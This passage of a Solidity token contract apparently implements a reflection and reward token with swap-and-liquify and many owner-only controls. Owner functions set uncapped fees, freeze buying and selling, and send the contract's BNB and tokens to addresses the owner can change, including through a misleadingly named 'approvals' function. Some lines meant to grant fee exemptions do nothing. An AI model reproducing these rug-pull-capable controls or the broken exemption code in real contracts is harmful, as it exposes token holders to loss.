        if(amount.mul(vsN).div(vsD) <= sT){vsT = amount.mul(vsN).div(vsD);}
        if(amount.mul(vsN).div(vsD) > sT){vsT = sT;}
        bool canSwap = contractTokenBalance >= vsT;
        bool aboveM = amount >= _asT;
        if(!swapping && swE && canSwap && from != pair && aboveM && !itCDh[from]){
            swapAndLiquify(vsT); }
        bool isSale;
        if(to == pair) isSale = true;
        _tokenTransfer(from, to, amount, !(iFxE[from] || iFxE[to]), isSale);
        if(!iDxE[from]) {
            try distributor.setShare(from, balanceOf(from)) {} catch {} }
        if(!iDxE[to]) {
            try distributor.setShare(to, balanceOf(to)) {} catch {} }
        if(mSts[from] < block.timestamp){
            try distributor.process(distributorGas) {} catch {}}
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require (amount <= _maxTxAmount || iTxLE[sender], "TX Limit Exceeded");
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale);
        if (_isExcluded[sender] ) {
                _tOwned[sender] = _tOwned[sender]-tAmount;}
        if (_isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;}
        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        _reflectRfi(s.rRfi, s.tRfi);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeMarketing(s.rMarketing, s.tMarketing);
        _takePrize(s.rPrize, s.tPrize);
        _takeRewards(s.rRewards, s.tRewards);
        _takeCharity(s.rCharity, s.tCharity);
        emit Transfer(sender, recipient, s.tTransferAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tRewards + s.tMarketing + s.tPrize + s.tCharity);
    }

    function updateRouter(address _router) external authorized {
        router = IRouter(address(_router));
    }

    function setTLE(address holder, bool exempt) external authorized {
        iTxLE[holder] = exempt;
    }

    function chkSmTx(bool selling, address from, uint256 amount) internal view {
        if(selling && mSts[from] < block.timestamp){
            require(amount <= _mStx || iTxLE[from]);}
    }

    function setMWP(uint256 _mnWP) external authorized {
        _maxWalletToken = (_tTotal * _mnWP) / 10000;
    }

    function setgas(uint256 _gso, uint256 _gss) external authorized {
        gso = _gso;
        gss = _gss;
    }

    function setLFG() external authorized {
        LFG = true;
    }

    function setRewardsEnable(bool _enabled) external authorized {
        rewards = _enabled;
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000, "gas is limited");
        distributorGas = gas;
    }

    function setiCdh(bool _enab, address _add) external authorized {
        itCDh[_add] = _enab;
    }

    function maxTL() external authorized {
        _maxTxAmount = _tTotal.mul(1);
        _maxWalletToken = _tTotal.mul(1);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setvarsT(uint256 _vstf, uint256 _vstd) external authorized {
        vsN = _vstf;
        vsD = _vstd;
    }

    function setMbTP(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_tTotal * _mnbTP) / 10000;
    }

    function setMsTx(uint256 _mstxP) external authorized {
        _mStx = (_tTotal * _mstxP) / 10000;
    }

    function setWME(address holder, bool exempt) external authorized {
        iMxWE[holder] = exempt;
    }

    function setsFrz(bool _status, uint8 _int) external authorized {
        sFrz = _status;
        sFrzT = _int;
    }

    function setbFrz(bool _status, uint8 _int) external authorized {
        bFrz = _status;
        bFrzT = _int;
    }

    function setmakT(address _mt) external authorized{
        mkwT = _mt;
    }

	function setprizeWT(address _prizeT) external authorized{
        prizewT = _prizeT;
    }

    function setcharWT(address _charT) external authorized{
        charitywT = _charT;
    }
	
    function swapAndLiquify(uint256 tokens) private lockTheSwap{
        uint256 denominator= (yr + xr + zr + cr + pr + chr) * 2;
        uint256 tokensToAddLiquidityWith = tokens * yr / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - yr);
        uint256 bnbToAddLiquidityWith = unitBalance * yr;
        if(bnbToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith); }
        uint256 zrAmt = unitBalance * 2 * zr;
        if(zrAmt > 0){
          payable(mkwA).transfer(zrAmt); }
        uint256 prAmt = unitBalance * 2 * pr;
        if(prAmt > 0){
          payable(przwA).transfer(prAmt); }
        uint256 chrAmt = unitBalance * 2 * chr;
        if(chrAmt > 0){
          payable(charwA).transfer(chrAmt); }
        uint256 xrAmt = unitBalance * 2 * xr;
        if(xrAmt > 0){
          try distributor.deposit{value: xrAmt}() {} catch {} }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpR,
            block.timestamp
        );
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function updateMWT(address newWallet) external authorized{
        require(mkwA != newWallet ,'Wallet already set');
        mkwA = newWallet;
        iFxE[mkwA];
    }

    function updatePRZWT(address newWallet) external authorized{
        require(przwA != newWallet ,'Prize Wallet already set');
        przwA = newWallet;
        iFxE[przwA];
    }

    function updateCHARWT(address newWallet) external authorized{
        require(charwA != newWallet ,'Charity Wallet already set');
        charwA = newWallet;
        iFxE[charwA];
    }

    function setautol(address _lpR) external authorized {
        lpR = _lpR;
    }

    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _newra, address _przwa, address _charwa) external authorized {
        mkwA = _mkwa;
        przwA = _przwa;
        charwA = _charwa;
        krhF = _krh;
        mdhS = _mdh;
        wthT = _wth;
        extR = _ext;
        tfU = _newra;
    }

        function setcsbf(uint256 _csb1, uint256 _csb2, uint256 _csb3, uint256 _csb4) external authorized {
        csb1 = _csb1;
        csb2 = _csb2;
        csb3 = _csb3;
        csb4 = _csb4;
    }

    function setvariable(uint256 _cvariable, uint256 _xvariable, uint256 _yvariable, uint256 _zvariable, uint256 _pvariable, uint256 _chvariable) external onlyOwner {
        cr = _cvariable;
        xr = _xvariable;
        yr = _yvariable;
        zr = _zvariable;
        pr = _pvariable;
        chr = _chvariable;
    }

    function cSb(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(tfU).transfer(amountBNB.mul(aP).div(100));
    }

    function performairdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized {
    uint256 SCCC = 0;
    require(addresses.length == tokens.length,"Mismatch between Address and token count");
    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];}
    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet for airdrop");
    for(uint i=0; i < addresses.length; i++){
        _tokenTransfer(from,addresses[i],tokens[i],false,true);}
    }

    function setFE(address holder, bool exempt) external authorized {
        iFxE[holder] = exempt;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(csb1).div(100);
        uint256 acBNBs = acBNBa.mul(csb2).div(100);
        uint256 acBNBt = acBNBa.mul(csb3).div(100);
        uint256 acBNBl = acBNBa.mul(csb4).div(100);
        (bool tmpSuccess,) = payable(krhF).call{value: acBNBf, gas: gss}("");
        (tmpSuccess,) = payable(mdhS).call{value: acBNBs, gas: gss}("");
        (tmpSuccess,) = payable(wthT).call{value: acBNBt, gas: gss}("");
        (tmpSuccess,) = payable(extR).call{value: acBNBl, gas: gss}("");
        tmpSuccess = false;
    }

    function setswe(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
        sT = _amount * (10 ** _decimals);
    }

    function setnewrew(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
    }

    function setmswt(uint256 _amount) external authorized {
        _asT = _amount * (10 ** _decimals);
    }

    function setswap(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getppr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cPRwds(_aPn, _aPd);
    }

    function _getMyRewards() external {
        address shareholder = msg.sender;
        distributor.getrewards(shareholder);
    }

    function getMyRewardsOwed(address _wallet) external view returns (uint256){
        return distributor.getRewardsOwed(_wallet);
    }

    function getMyTotalRewards(address _wallet) external view returns (uint256){
        return distributor.getTotalRewards(_wallet);
    }

    function getccr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRwds(_aPn, _aPd);
    }

    function currentReward() public view returns (address) {
        return distributor.getRAddress();
    }

    function gettotalRewardsDistributed() public view returns (uint256) {
        return distributor.gettotalDistributed();
    }
  
    receive() external payable{
    }
}